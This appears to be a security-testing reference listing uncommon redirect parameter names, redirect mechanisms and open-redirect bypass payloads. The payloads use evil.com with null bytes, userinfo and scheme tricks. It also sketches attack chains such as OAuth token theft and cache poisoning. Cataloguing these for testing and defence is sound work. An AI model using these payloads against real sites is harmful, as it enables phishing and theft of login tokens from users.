# Extended corpus — the residual arms and the rare surfaces

## The rare param names — the long-tail vocabulary

```text
the exhaustive vocabulary — beyond the common names:
  go_to  return_path  return_path_to  original_url  originating_url
  orig_url  orig  old_url  previous_url  prev_url  back_url  backurl
  bounce  relay_url  relayState  relay_state  acs_url  consumer_url
  assertion_url  response_url  reply_url  wreply  wctx  wa  wresult
  continue_url  continueUrl  continue_to  proceed  proceed_to
  success_url  cancel_url  failure_url  error_url  checkout_url
  confirm_url  approval_url  denied_url  landing_url  landing_page
  home_url  start_url  entry_url  exit_url  leave_url  away_url
  external_url  ext_url  foreign_url  jump_url  hop_url  bridge_url
  gateway_url  portal_url  via_url  through_url  image_url  img_url
  src_url  source_url  feed_url  file_url  doc_url  document_url
  download_url  load_url  content_url  data_url  service_url
  oauth_callback  oauth_redirect  sso_url  saml_url  auth_url
  login_url  logout_url  signin_url  signout_url  register_url
```

## The rare carriers — the unusual redirect mechanisms

```text
Location: header       <- the canonical
Refresh: header        <- a non-Location response header
<meta refresh>         <- the tag
window.location        <- the JS global
location.href          <- the property
location.replace       <- the method
location.assign        <- the method
location = <x>         <- the bare assignment
location.hash          <- the fragment-nav
history.pushState      <- a same-origin path-change
history.replaceState   <- a same-origin path-change
document.location      <- the document variant
self.location          <- the self variant
top.location           <- the top-frame variant (a frame-bust redirect)
parent.location        <- the parent-frame variant
window.open(url)       <- a new-window nav — a redirect-ish
XMLHTTPRequest redirect<- a fetch-API redirect — a JS-carried
```

## The rare bypass arms — the exotic differentials

```text
the IPv6 forms:
  https://[::ffff:127.0.0.1]/     <- an IPv4-mapped IPv6 — the SSRF-twin
  https://[evil-v6-addr]/          <- an IPv6 literal
the percent-encoding edge:
  https://evil.com%00             <- a null-byte — some parsers truncate
  https://evil.com%0a             <- an LF
  https://evil.com%0d             <- a CR
the case-mix:
  HTTPS://EVIL.COM                <- a full-case
  HtTpS://EvIl.CoM                <- a mixed
the userinfo-extreme:
  https://a@b@c@evil.com          <- multiple @
  https://:@evil.com               <- an empty userinfo
  https://a:b@c@evil.com           <- userinfo with colons
the port-edge:
  https://evil.com:443            <- the explicit port
  https://evil.com:0              <- port-0
  https://evil.com:65535          <- the max-port
  https://evil.com:443@target.com <- the port-userinfo mix
the dot-edge:
  https://target.com.             <- the trailing-dot — DNS-normalizes
  https://target.com..            <- a double-dot
  https://target.com%2e           <- an encoded .
  https://target.com%252e         <- a double-encoded .
the scheme-edge:
  https:///evil.com               <- a triple-slash after the scheme
  https:/evil.com                 <- a single-slash
  https:evil.com                  <- no-slash
  https//evil.com                 <- no-colon
  https:/\/evil.com               <- a mixed
  https:\\evil.com                <- a \\
```

## The rare two-step surfaces

```text
the /set-then-fire pairs:
  /register?return_to=X -> /login
  /set-locale?next=X -> /locale
  /oauth/init?redirect_uri=X -> /oauth/callback
  /form/step1?return=X -> /form/step2 -> /form/submit
  /logout?return=X -> the session's stored return -> a LATER login
the cross-session:
  a param stored in a persistent cookie -> fires on a later SESSION's login
```

## The rare chain-shapes

```text
open-redirect -> cache-poisoning    -> the Location: cached -> every visitor
open-redirect + CSRF                -> a CSRF setting `next` -> the victim's
                                     login redirects
open-redirect + token-in-fragment   -> the OAuth implicit's #access_token
open-redirect + a Referer-leak      -> the originating URL in the Referer
open-redirect -> a deep-link        -> a QR/app-link generator
open-redirect -> a CORS             -> a redirect-chain that carries a
                                     cross-origin header
open-redirect + a SOP-edge          -> a redirect that reads a cross-origin
                                     body's size/timing (xs-leaks twin)
```

## The rare filter-shapes

```text
a hash-signature check            -> the param is signed — a signature the
                                    attacker can't forge (a closed surface)
a single-use nonce                -> the redirect is nonce-bound — a one-shot
a referrer-origin check           -> the Referer's origin is allowlisted
a CSP-report-only redirect        <- a CSP that's report-only — the JS nav
                                    isn't blocked
a service-worker intercept        <- a SW that rewrites the destination —
                                    a client-side override surface
```

## The extended-corpus record

`corpus: <the-rare-arm>: <the-rare-surface>: <the-verdict>` — the long-tail
arms and surfaces beyond the canonical corpus.
